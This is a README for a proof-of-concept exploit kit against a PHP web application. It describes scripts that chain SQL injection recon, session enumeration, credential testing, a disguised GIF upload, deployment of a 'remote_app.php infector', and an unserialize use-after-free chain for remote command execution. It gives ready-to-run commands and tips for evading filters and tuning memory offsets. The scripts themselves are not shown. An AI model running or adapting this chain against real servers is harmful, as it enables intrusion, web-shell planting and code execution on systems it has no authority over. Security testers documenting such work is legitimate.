# PoC scripts

Standard library only. Set `BASE` in `common.py` (or edit the top of each script) to your
target.

| Script | Stage | Writes? |
|--------|-------|---------|
| `common.py` | shared oracle / login / upload helpers | — |
| `01_recon.py` | SQLi oracle + runtime fingerprint | no |
| `02_sessions.py` | session table enumeration | no |
| `03_login.py` | credential test | no |
| `04_upload.py` | upload primitive demo | yes (one file) |
| `05_deploy.py` | deploy `remote_app.php` infector | yes |
| `pocket_poc.py` | unserialize UAF chain | yes (on R-7) |
| `cleanup.py` | overwrite planted files with inert GIFs | yes |

## Quick run

```bash
python 01_recon.py
python 03_login.py maha maha
python 05_deploy.py maha maha
python pocket_poc.py --url https://example.com/pmb/remote_app.php --insecure --port 443 "id>/dev/shm/x"
python cleanup.py maha maha
```

## Notes

- The endpoint breaks on literal quotes — all string literals are hex-encoded (`0x…`).
- `camera_upload.php` requires the `data:image/gif;base64,` prefix and a valid GIF header.
- `pocket_poc.py` geometry is build-specific; derive the `zval`/`EG` offsets from the target's
  `libphp7.4.so` before running (see `../docs/chain-internals.md`).
